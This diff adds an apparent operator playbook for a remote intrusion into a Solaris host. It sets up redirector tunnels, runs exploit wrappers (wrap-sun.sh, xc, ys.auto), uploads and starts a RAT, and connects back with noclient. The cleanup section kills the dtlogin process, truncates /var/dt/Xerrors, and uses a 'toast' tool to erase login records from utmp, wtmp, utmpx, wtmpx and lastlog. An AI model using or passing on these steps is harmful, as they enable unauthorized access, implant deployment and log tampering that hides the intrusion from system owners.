@@ -1,0 +1,134 @@
+mx
+:%s/PITCH_IP/PITCH_IP/g
+:%s/TARGET_IP/TARGET_IP/g
+:%s/HOST_NAME/HOST_NAME/g
+:%s/DOMAIN_NAME/DOMAIN_NAME/g
+:%s/RAT_NAME/RAT_NAME/g
+:%s/RHP-22/RHP-22/g
+:%s/RHP-23/RHP-23/g
+:%s/RHP-24/RHP-24/g
+:%s/WORK_DIR/WORK_DIR/g
+`x
+
+### If ratload fails, use doubleT
+# wrap-telnet.sh -l REDIRECTIP -p RHP-22 -s RHP-23 -x RHP-24
+# xc -x REDIRECTIP -y RHP-24 -s REDIRECTIP 127.0.0.1
+# doubleT -i PITCH_IP -t RHP-22 RHP-23
+# -tunnel
+# u 177 TARGET_IP
+# r RHP-22
+# r RHP-23
+# r RHP-24
+
+# On redirector - set up nopen tunnel
+
+-tunnel
+u 177 TARGET_IP
+r RHP-24
+r RHP-21
+s
+
+######## use ys.auto first which won't require you to start separate xc command
+######## selects random ports for you
+######## brings up scripted packrat window
+######## gives pastable -tunnel commands if redirecting
+########  examples:
+####   ys.auto -l 19.16.1.1 -i 10.0.3.1 -n 2222 -r nscd -x 9999 -d /tmp/.dir
+####   ys.auto -i 10.0.3.1
+####   ys.auto -i TARGET_IP -l REDIRECTOR_IP
+#######<ctrl><c> or <ctrl><d> on nc window first, then delete all pop-ups
+
+        #Local window1
+./wrap-sun.sh -l PITCH_IP -r RAT_NAME -p RHP-21 -x RHP-24 -d /tmp/WORK_DIR
+        #hit return
+        # type y and hit return
+
+        #Local window2
+        # for redirection local ip is redirector ip
+
+./xc -s PITCH_IP -x PITCH_IP -y RHP-24 TARGET_IP
+        #hit return
+        #hit return
+        #hit return
+        #(At this point you should see a continue.... in your attack1 window
+
+        #in the attack1 window
+        #hit return
+        #hit return
+        #hit return
+
+        #(you should see your upload happen...)
+
+        #Ctrl-C your nc window
+        #Ctrl-C your xc window
+#w/o tunneling
+../bin/noclient TARGET_IP
+
+#w/ tunneling. In redirector window
+-nstun TARGET_IP
+
+##### If ratload fails, use doubleT
+# wrap-telnet.sh -l REDIRECTIP -p RHP-22 -s RHP-23 -x RHP-24
+# xc -x REDIRECTIP -y RHP-24 -s REDIRECTIP 127.0.0.1
+# doubleT -i PITCH_IP -t RHP-22 RHP-23
+# -tunnel
+# u 177 TARGET_IP
+# r RHP-22
+# r RHP-23
+# r RHP-24
+##### otherwise continue
+
+-rm RAT_NAME
+
+##### Cleaning up ######
+ps -ef |grep dtlogin
+
+# You should see a recent one : mine was
+kill -9 DTLOGINPORT
+
+ps -ef |grep dtlogin
+
+-ls -t /var/dt/
+
+# you will notice Xerrors is the most recent
+
+-tail /var/dt/Xerrors
+
+# if your entries are the only ones there....
+
+cat /dev/null >/var/dt/Xerrors
+
+# if there are other entries you will do something like
+
+wc -l /var/dt/Xerrors
+
+subtract the number of lines that are because of you from above
+
+head -(what's left) > t ; cat t
+
+if it looks good:
+
+cat t >/var/dt/Xerrors
+-rm t
+
+-ls -t /var/adm
+#anything that has a resonably current timestamp you should check
+
+#toasting the login entries.....
+
+# Target window
+-put ../up/toast t
+
+### TO VIEW...
+./t -u /var/adm/utmp
+./t -u /var/adm/wtmp | tail -20
+./t -x /var/adm/utmpx
+./t -x /var/adm/wtmpx | tail -20
+./t -l /var/adm/lastlog | tail
+
+### TO ZAP...
+./t -u /var/adm/utmp tty date
+./t -u /var/adm/wtmp tty date
+./t -x /var/adm/utmpx tty date
+./t -x /var/adm/wtmpx tty date
+
